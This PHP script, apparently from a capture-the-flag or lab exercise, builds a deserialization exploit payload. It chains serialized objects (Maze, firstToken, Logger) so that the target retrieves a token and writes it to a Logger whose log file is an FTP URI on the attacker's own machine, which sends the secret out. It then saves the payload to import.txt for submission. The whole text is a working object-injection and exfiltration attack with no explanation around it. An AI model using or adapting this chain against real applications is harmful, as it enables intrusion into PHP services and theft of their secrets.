<?php 

// Contains all of the partial declarations of the classes we need
include_once("./class.php");

// Start with something that can run without error (Maze)
$payload = @serialize(new Maze());

// Call the firstToken method to retrieve the token
$payload = makeImporterSerial($payload, new firstToken(), "token");

// Call the logger, but with file set to ftp://IP
$ip = current(preg_grep('/^10\./', explode(' ', trim(shell_exec('hostname -I')))));

$URI = "ftp://user:password@$ip:2121";

$logger = new Logger();
$logger->logFile = $URI;

$payload = makeImporterSerial($payload, $logger, "log");

echo "$payload\n";
file_put_contents("import.txt", $payload);
